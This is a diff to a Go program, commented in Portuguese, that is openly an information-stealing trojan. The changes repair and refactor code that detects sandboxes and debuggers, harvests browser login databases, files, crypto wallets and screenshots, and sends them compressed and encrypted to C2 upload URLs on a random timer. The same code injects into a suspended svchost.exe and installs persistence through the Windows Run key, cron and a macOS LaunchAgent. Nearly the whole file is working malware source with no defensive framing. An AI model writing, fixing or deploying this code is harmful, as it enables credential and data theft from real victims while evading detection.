@@ -1,4 +1,3 @@
-go
 package main
 
 import (
@@ -11,7 +10,8 @@ import (
 	"fmt"
 	"image/png"
 	"io"
-	"io/ioutil"
+	mrand "math/rand"
+	"net"
 	"net/http"
 	"os"
 	"os/exec"
@@ -19,19 +19,27 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
-	"syscall"
 	"time"
 	"unsafe"
 
 	"github.com/kbinani/screenshot"
 	"github.com/klauspost/compress/zlib"
 	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/registry"
 )
 
-// Chave de criptografia dinâmica baseada no hostname e MAC
+// Chave de criptografia derivada do hostname e do primeiro MAC disponível
 func generateKey() []byte {
 	h, _ := os.Hostname()
-	hash := sha256.Sum256([]byte(h + time.Now().String()))
+	ifaces, _ := net.Interfaces()
+	mac := ""
+	for _, iface := range ifaces {
+		if hw := iface.HardwareAddr.String(); hw != "" {
+			mac = hw
+			break
+		}
+	}
+	hash := sha256.Sum256([]byte(h + mac))
 	return hash[:]
 }
 
@@ -65,6 +73,38 @@ type Info struct {
 	CryptoWallets []string
 }
 
+var (
+	kernel32                 = windows.NewLazySystemDLL("kernel32.dll")
+	procGlobalMemoryStatusEx = kernel32.NewProc("GlobalMemoryStatusEx")
+	procIsDebuggerPresent    = kernel32.NewProc("IsDebuggerPresent")
+	procVirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
+	procWriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
+	procCreateRemoteThread   = kernel32.NewProc("CreateRemoteThread")
+	procResumeThread         = kernel32.NewProc("ResumeThread")
+)
+
+type memoryStatusEx struct {
+	Length               uint32
+	MemoryLoad           uint32
+	TotalPhys            uint64
+	AvailPhys            uint64
+	TotalPageFile        uint64
+	AvailPageFile        uint64
+	TotalVirtual         uint64
+	AvailVirtual         uint64
+	AvailExtendedVirtual uint64
+}
+
+func totalPhysMemory() uint64 {
+	var m memoryStatusEx
+	m.Length = uint32(unsafe.Sizeof(m))
+	r1, _, _ := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&m)))
+	if r1 == 0 {
+		return 0
+	}
+	return m.TotalPhys
+}
+
 // Verifica se está em ambiente de análise (sandbox/VM)
 func isSandbox() bool {
 	// Verifica tempo de execução
@@ -75,10 +115,7 @@ func isSandbox() bool {
 	}
 
 	// Verifica memória baixa
-	var mem windows.MemoryStatusEx
-	mem.Length = uint32(unsafe.Sizeof(mem))
-	windows.GlobalMemoryStatusEx(&mem)
-	if mem.TotalPhys < 2*1024*1024*1024 { // Menos de 2GB
+	if total := totalPhysMemory(); total > 0 && total < 2*1024*1024*1024 {
 		return true
 	}
 
@@ -93,7 +130,7 @@ func isSandbox() bool {
 	}
 
 	// Verifica presença de debugger
-	if syscall.IsDebuggerPresent() {
+	if r1, _, _ := procIsDebuggerPresent.Call(); r1 != 0 {
 		return true
 	}
 
@@ -146,7 +183,7 @@ func collectSystemInfo() Info {
 	for _, path := range paths {
 		files, _ := filepath.Glob(path + "/*")
 		for _, file := range files {
-			content, err := ioutil.ReadFile(file)
+			content, err := os.ReadFile(file)
 			if err == nil {
 				info.Files[file] = base64.StdEncoding.EncodeToString(content)
 			}
@@ -156,7 +193,7 @@ func collectSystemInfo() Info {
 	// Coleta credenciais
 	for _, path := range paths {
 		if strings.Contains(path, "Login Data") {
-			content, err := ioutil.ReadFile(path)
+			content, err := os.ReadFile(path)
 			if err == nil {
 				info.Credentials = append(info.Credentials, base64.StdEncoding.EncodeToString(content))
 			}
@@ -197,44 +234,53 @@ func encrypt(data []byte, key []byte) ([]byte, error) {
 
 // Compressão de dados
 func compress(data []byte) ([]byte, error) {
-	var b strings.Builder
-	w, _ := zlib.NewWriterLevel(&b, zlib.BestCompression)
-	_, err := w.Write(data)
+	var b bytes.Buffer
+	w, err := zlib.NewWriterLevel(&b, zlib.BestCompression)
 	if err != nil {
 		return nil, err
 	}
-	w.Close()
-	return []byte(b.String()), nil
+	if _, err = w.Write(data); err != nil {
+		w.Close()
+		return nil, err
+	}
+	if err = w.Close(); err != nil {
+		return nil, err
+	}
+	return b.Bytes(), nil
 }
 
 // Exfiltração para servidor C2
 func exfiltrate(data string, screenshot []byte, key []byte) error {
+	client := &http.Client{Timeout: 15 * time.Second}
 	domains := []string{
 		obfuscate("https://backup1.example.com/upload", key),
 		obfuscate("https://backup2.example.com/upload", key),
 	}
 	for _, domain := range domains {
 		url := deobfuscate(domain, key)
-		compressed, _ := compress([]byte(data))
+		compressed, err := compress([]byte(data))
+		if err != nil {
+			continue
+		}
 		encrypted, err := encrypt(compressed, key)
 		if err != nil {
 			continue
 		}
 
-		// Envia dados textuais
-		resp, err := http.Post(url, "application/octet-stream", strings.NewReader(string(encrypted)))
+		resp, err := client.Post(url, "application/octet-stream", bytes.NewReader(encrypted))
 		if err == nil {
 			resp.Body.Close()
 		}
 
-		// Envia captura de tela
 		if len(screenshot) > 0 {
-			compressedShot, _ := compress(screenshot)
-			encryptedShot, err := encrypt(compressedShot, key)
+			compressedShot, err := compress(screenshot)
 			if err == nil {
-				resp, err := http.Post(url+"/screenshot", "application/octet-stream", strings.NewReader(string(encryptedShot)))
+				encryptedShot, err := encrypt(compressedShot, key)
 				if err == nil {
-					resp.Body.Close()
+					resp, err := client.Post(url+"/screenshot", "application/octet-stream", bytes.NewReader(encryptedShot))
+					if err == nil {
+						resp.Body.Close()
+					}
 				}
 			}
 		}
@@ -248,78 +294,47 @@ func exfiltrate(data string, screenshot []byte, key []byte) error {
 
 // Injeção em processo real
 func injectIntoProcess(key []byte) error {
-	var procInfo syscall.ProcessInformation
-	var startInfo syscall.StartupInfo
+	var si windows.StartupInfo
+	var pi windows.ProcessInformation
 
 	// Inicia svchost.exe em estado suspenso
-	cmd := deobfuscate(obfuscate("svchost.exe", key), key)
-	err := syscall.CreateProcess(
-		nil,
-		syscall.StringToUTF16Ptr(cmd),
-		nil,
-		nil,
-		false,
-		syscall.CREATE_SUSPENDED,
-		nil,
-		nil,
-		&startInfo,
-		&procInfo,
-	)
-	if err != nil {
+	cmd := deobfuscate(obfuscate("C\\Windows\\System32\\svchost.exe", key), key)
+	cmdPtr, _ := windows.UTF16PtrFromString(cmd)
+	if err := windows.CreateProcess(nil, cmdPtr, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &si, &pi); err != nil {
 		return err
 	}
 
-	// Payload simples para injeção (exemplo: exibe mensagem)
-	payload := []byte{
-		0x90, 0x90, 0x90, // NOP sled
-		0xC3, // RET
-	}
+	// Payload simples para injeção (exemplo: NOP + RET)
+	payload := []byte{0x90, 0x90, 0x90, 0xC3}
 
-	// Aloca memória no processo remoto
-	var baseAddr uintptr
-	var size = uintptr(len(payload))
-	err = windows.VirtualAllocEx(
-		procInfo.Process,
-		0,
-		size,
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
-		&baseAddr,
-	)
-	if err != nil {
+	size := uintptr(len(payload))
+	remoteAddr, _, err := procVirtualAllocEx.Call(uintptr(pi.Process), 0, size, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	if remoteAddr == 0 {
+		windows.TerminateProcess(pi.Process, 0)
+		windows.CloseHandle(pi.Process)
+		windows.CloseHandle(pi.Thread)
 		return err
 	}
 
-	// Escreve payload no processo remoto
-	var bytesWritten uintptr
-	err = windows.WriteProcessMemory(
-		procInfo.Process,
-		baseAddr,
-		&payload[0],
-		size,
-		&bytesWritten,
-	)
-	if err != nil {
+	_, _, err = procWriteProcessMemory.Call(uintptr(pi.Process), remoteAddr, uintptr(unsafe.Pointer(&payload[0])), size, 0)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		windows.TerminateProcess(pi.Process, 0)
+		windows.CloseHandle(pi.Process)
+		windows.CloseHandle(pi.Thread)
 		return err
 	}
 
-	// Cria thread remota para executar o payload
-	var threadId uint32
-	_, err = windows.CreateRemoteThread(
-		procInfo.Process,
-		nil,
-		0,
-		baseAddr,
-		0,
-		0,
-		&threadId,
-	)
-	if err != nil {
+	thread, _, err := procCreateRemoteThread.Call(uintptr(pi.Process), 0, 0, remoteAddr, 0, 0, 0)
+	if thread == 0 {
+		windows.TerminateProcess(pi.Process, 0)
+		windows.CloseHandle(pi.Process)
+		windows.CloseHandle(pi.Thread)
 		return err
 	}
-
-	// Retoma a execução do processo
-	windows.ResumeThread(procInfo.Thread)
+	procResumeThread.Call(uintptr(pi.Thread))
+	windows.CloseHandle(windows.Handle(thread))
+	windows.CloseHandle(pi.Process)
+	windows.CloseHandle(pi.Thread)
 	return nil
 }
 
@@ -327,16 +342,11 @@ func injectIntoProcess(key []byte) error {
 func ensurePersistence(key []byte) {
 	switch runtime.GOOS {
 	case "windows":
-		keyPath := deobfuscate(obfuscate(`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`, key), key)
-		cmd := deobfuscate(obfuscate(os.Args[0], key), key)
-		syscall.RegSetValueEx(
-			syscall.HKEY_CURRENT_USER,
-			syscall.StringToUTF16Ptr(keyPath),
-			0,
-			syscall.REG_SZ,
-			(*byte)(unsafe.Pointer(syscall.StringToUTF16Ptr(cmd))),
-			uint32(len(cmd)*2),
-		)
+		keyPath := `Software\Microsoft\Windows\CurrentVersion\Run`
+		if k, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE); err == nil {
+			defer k.Close()
+			k.SetStringValue("InfoHaze", os.Args[0])
+		}
 	case "linux":
 		cron := deobfuscate(obfuscate("*/5 * * * * "+os.Args[0], key), key)
 		exec.Command("crontab", "-l").Run()
@@ -357,7 +367,7 @@ func ensurePersistence(key []byte) {
     <true/>
 </dict>
 </plist>`, os.Args[0])
-		ioutil.WriteFile(os.Getenv("HOME")+"/Library/LaunchAgents/com.user.agent.plist", []byte(plist), 0644)
+		os.WriteFile(os.Getenv("HOME")+"/Library/LaunchAgents/com.user.agent.plist", []byte(plist), 0644)
 	}
 }
 
@@ -373,7 +383,9 @@ func main() {
 	ensurePersistence(key)
 
 	// Injeção em processos
-	injectIntoProcess(key)
+	if err := injectIntoProcess(key); err != nil {
+		fmt.Println("falha na injeção:", err)
+	}
 
 	// Coleta de dados
 	info := collectSystemInfo()
@@ -382,11 +394,12 @@ func main() {
 	data := fmt.Sprintf("Username: %s\nHostname: %s\nOS: %s\nFiles: %v\nCredentials: %v\nWallets: %v",
 		info.Username, info.Hostname, info.OS, info.Files, info.Credentials, info.CryptoWallets)
 
+	mrand.Seed(time.Now().UnixNano())
 	// Exfiltração
 	go func() {
 		for {
 			exfiltrate(data, info.Screenshot, key)
-			time.Sleep(time.Duration(5+rand.Intn(5)) * time.Minute) // Intervalo aleatório
+			time.Sleep(time.Duration(5+mrand.Intn(5)) * time.Minute) // Intervalo aleatório
 		}
 	}()
 
